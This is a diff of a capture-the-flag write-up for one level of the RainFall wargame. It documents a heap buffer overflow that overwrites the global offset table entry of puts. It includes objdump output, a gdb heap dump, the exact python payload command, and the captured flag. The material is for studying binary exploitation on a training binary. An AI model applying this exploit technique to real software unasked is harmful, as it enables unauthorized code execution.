@@ -1,6 +1,8 @@
-# Level 05
+# Level 07
 
 ## Analysis
+
+## Attack type: Heap Buffer overflow to overwrite global offset table (GOT)
 
 We started by checking the file binary with objdump and found the following stuff:
 ```bash
@@ -22,19 +24,57 @@ OFFSET   TYPE              VALUE
 08049934 R_386_JUMP_SLOT   fopen
 ```
 
-There is two functions `m` and `n`. After decompile it on ghidra we saw that `n` was never call. We read main function and we undestood that there is two variable on the heap. One them is pointer of function, which is call after doing a strcpy. We directly thinking about the overflow on strcpy to override the content pointed by the pointer of function. We simply made mask using (https://wiremask.eu/tools/buffer-overflow-pattern-generator/) test the poadding between those 2 variables (another way also do to verify this value is to use gdb).
-
 ```bash
-(gdb) r "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
-Starting program: /home/user/level6/level6 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
-
-Program received signal SIGSEGV, Segmentation fault.
-0x41346341 in ?? ()
+level7@RainFall:~$ objdump -d level7
+...
+level7:     file format elf32-i386
+...
+080484f4 <m>:
+ 80484f4:	55                   	push   %ebp
+...
 ```
 
-So the offset is 72, so after copying 72, we can override the content pointed by the pointer of function. By reading the output of objdump, we know that `n` address is `08048454`.
-We have everything to build the payload:
 
+After this we decompile it, and saw that there is two struct or array named `s1` and `s2`. In both of them, at the first position we initialyze memory with an integer, and in second position we initialyze pointer to new memory space. Program copy from argv1 to `s1->heap_space` then copy argv2 to `s1->heap_space`.
+
+Here the heap memory state when we call binary with `AAAA` and `BBBB`
+
+
+```bash
+(gdb) run AAAA BBBB
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level7/level7 AAAA BBBB
+
+Breakpoint 1, 0x080485d3 in main ()
+(gdb) x/64x 0x804a000
+0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
+0x804a010:      0x00000000      0x00000011      0x41414141      0x00000000
+0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
+0x804a030:      0x00000000      0x00000011      0x42424242      0x00000000
+0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
+0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a080:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a090:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0b0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0c0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0d0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0e0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0f0:      0x00000000      0x00000000      0x00000000      0x00000000
+```
+
+We can see that there is padding of 20 between `s1->heap_space` and `s2->a`. From this moment, we can imagine to overflow the heap space reserved for s1->heap_space to override `s2->a`, but we have to find by what kind of data we have to do it.
+
+If we read the next lines of strcpy, we can see that there is a call to fopen to read `.pass` file from level 8, then copy it to a global variable `c`, then a call to `puts` function that do nothing interesting. After resolving the previous level, we know we can overwrite the `global offset table` address of puts to call another function (replace it). So we tried to it with `m` because it print the content of global variable, and if we do it after reading flag, it will print the flag.
+
+From objdump, we found the `puts` address: `0x08049928`
+We know the padding used with gdb: `20`
+We just need to know now the address of `m`: `0x080484f4`
+
+Only need to build the payload now:
 ```bash
 level7@RainFall:~$ ./level7 $(python -c 'import struct; print 20*"A" + struct.pack("I", 0x08049928)') $(python -c 'import struct; print struct.pack("I", 0x080484f4)')
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
